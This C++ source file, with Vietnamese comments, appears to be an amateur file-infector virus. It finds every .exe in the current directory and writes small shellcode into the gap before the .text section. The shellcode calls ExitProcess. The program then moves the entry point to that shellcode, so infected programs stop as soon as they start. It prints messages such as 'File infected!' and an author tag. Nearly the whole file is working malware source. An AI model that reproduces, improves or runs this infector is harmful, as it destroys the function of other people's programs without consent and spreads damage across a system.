#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
#include <conio.h>
#include <direct.h>
#include <string>
#include <cstdlib>
#include <stdlib.h>
#include <iostream>
#include <fstream>
#include <assert.h>
#include <fileapi.h>
#include <Shlwapi.h>
// remember to link against shlwapi.lib
// in VC++ this can be done with
#pragma comment(lib, "Shlwapi.lib")

#define _CRT_SECURE_NO_WARNINGS
#pragma warning(disable:4996)

using namespace std;
using std::mbstowcs;


int GetTextSectionOffset(PIMAGE_SECTION_HEADER pSectionHeader, int NumberOfSections)
{
	if (NumberOfSections > 0) {
		if (!_strcmpi((char*)pSectionHeader->Name, ".text")) {
			return pSectionHeader->PointerToRawData;
		}
	}
	/* we did not find .text section */
	return 0;
}

int main()
{
	HANDLE hFile;
	HANDLE hMap;
	char *MappedFile = 0;
	DWORD FileSize; /* file size */
	DWORD delta;
	DWORD SectionOffset; /* .text section offset*/
	DWORD func_addr;
	IMAGE_DOS_HEADER *pDosHeader;
	IMAGE_NT_HEADERS *pNtHeader;
	IMAGE_SECTION_HEADER *pSecHeader;

	/* shell code*/
	char code[] =
		"\x6A\x00"              /*push 0 */
		"\xB8\x00\x00\x00\x00"  /*mov eax , func_addr (address will be inserted automaticly)*/
		"\xFF\xD0";             /*call eax */

	;
	///// liet ke cac file trong thu muc vao data.txt
	system("forfiles /p . > data.txt");
	char *line = new char[100];
	assert(line);
	std::ifstream ifs("data.txt", std::ios::in);
	if (ifs.bad()) {
		std::cout << "Error opening for reading";
		perror("data.txt");
		exit(-1);
	}
	////// chuyen ten cac file vao argv[]
	/*
	while (!ifs.eof()) {
	ifs >> line;
	std::cout << line<< std::endl;
	}
	*/
	string argv[1000];
	char *xau = new char[100]; 
	int j = 0;
	FILE *f;
	fopen_s(&f, "data.txt", "r");
	while (!feof(f)){
		fgets(xau, 100, f);
		strcpy(&xau[0], &xau[1]);
		string xau1=xau;
		if (xau1.length() > 4)
		{
			xau1.erase(xau1.end() - 2, xau1.end());
			string xau2 = xau1.substr(xau1.length() - 4, xau1.length() - 1);
			if (xau2.compare(".exe") == 0)
			{
				argv[j] = xau1;
				cout << argv[j] << endl;
				j++;
			}
		}
	}
	int argc = j;
	cout << endl << argc << endl;
	/*
	FILE *f;
	int j=0;
	fopen_s(&f,"data.txt", "r");
	while (!feof(f)){
	fscanf_s(f, "%s", &xau);
	a[j] = xau;
	printf("%s\n", a[j]);
	j++;
	}
	*/

	//////////////////////////////////////////////////////////
	
	if (argc < 1) {
		printf("there is no pe file in this directory \n");
		printf("inflected by f4r4@nh \n");
		return 0;
	}
	//xac dinh ten cua chinh chuong trinh nay
	char  *loca = new char[100], *thistitle = new char[100];
	GetCurrentDirectory(100, loca);
	cout << endl << loca << endl;
	thistitle = PathFindFileName(loca);
	cout << thistitle << endl;

	/*
	//////////////DO IT MYSELF: LiST THE DIRECTORY////////////////////////////
	char* cwd;
	char buff[_MAX_PATH + 1];
	cwd = _getcwd(buff, _MAX_PATH);
	if (cwd != NULL){
		printf("my dir: %s\n", cwd);
	}

	WIN32_FIND_DATA data;
	HANDLE h = FindFirstFile(cwd, &data);
	if (h != INVALID_HANDLE_VALUE)
	{
		do
		{
			char*   nPtr = new char[lstrlen(data.cFileName) + 1];
			for (int i = 0; i < lstrlen(data.cFileName); i++)
				nPtr[i] = char(data.cFileName[i]);

			nPtr[lstrlen(data.cFileName)] = '\0';
			printf("%s \n", nPtr);
		} while (FindNextFile(h, &data));
	}
	else
		printf("no directory");
	FindClose(h);
	*/
	/////////////////////////////////////////////////////////
	for (int b = 1; b < argc; b++)
	{
		std::strcpy(xau, argv[b].c_str());
		printf("\n\n\ntarget: [%s] \n", xau);
		hFile = CreateFile(xau, GENERIC_WRITE | GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
		if (hFile == INVALID_HANDLE_VALUE && xau != thistitle) {
			printf("[Error]: Can't open File! Error code : %d", GetLastError());
			
		}
		else
		{
			FileSize = GetFileSize(hFile, 0);
			printf("[File Size ]: %d \n", FileSize);
			/* mapping file */
			hMap = CreateFileMapping(hFile, 0, PAGE_READWRITE, 0, FileSize, 0);

			if (hMap == INVALID_HANDLE_VALUE) {
				printf("[Error]: Can't map file! Error code: %d\n", GetLastError());
				CloseHandle(hFile);
			}
			else
			{
				MappedFile = (char*)MapViewOfFile(hMap, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, FileSize);
				if (MappedFile == NULL) {
					printf("[Error]: Can't map file! Error code %d\n", GetLastError());
					CloseHandle(hFile);
					CloseHandle(hMap);
					UnmapViewOfFile(MappedFile);
				}
				else
				{
					pDosHeader = (IMAGE_DOS_HEADER*)MappedFile;
					pNtHeader = (IMAGE_NT_HEADERS*)((DWORD)MappedFile + pDosHeader->e_lfanew);
					pSecHeader = IMAGE_FIRST_SECTION(pNtHeader);
					SectionOffset = GetTextSectionOffset(pSecHeader, pNtHeader->FileHeader.NumberOfSections);
					if (SectionOffset == 0) {
						printf("[Error]: Can't find .text section!\n");
						CloseHandle(hFile);
						CloseHandle(hMap);
						UnmapViewOfFile(MappedFile);
					}
					else
					{
						delta = SectionOffset - sizeof(code);
						int i;
						BYTE check;

						printf("scanning...\n");
						int infd = 0;
						for (i = 0; i < sizeof(code); i++) {
							check = *((BYTE*)MappedFile + delta + i);
							printf("%X \t", check);
							if (check != 0) {
								printf("There is some data...\n");
								infd = 1;
								CloseHandle(hFile);
								CloseHandle(hMap);
								UnmapViewOfFile(MappedFile);
								break;
							}
						}
						if (infd == 0)
						{
							printf("Space if free, infecting File...\n");
							func_addr = (DWORD)GetProcAddress(LoadLibrary("kernel32.dll"), "ExitProcess");
							for (i = 0; i < sizeof(code); i++) {
								if (*(DWORD*)&code[i] == 0x00000B8) {
									*(DWORD*)(code + i + 1) = func_addr;
								}
							}
							printf("Old Entry Point : %08X \n",
								pNtHeader->OptionalHeader.AddressOfEntryPoint);

							memcpy(MappedFile + delta, code, sizeof(code));
							pNtHeader->OptionalHeader.AddressOfEntryPoint = delta;
							printf("File infected!\n");
							printf("New Entry Point: %08X \n", delta);

							CloseHandle(hFile);
							CloseHandle(hMap);
							UnmapViewOfFile(MappedFile);
						}
					}
				}
			}	
		}
	}
	
	return 0;
}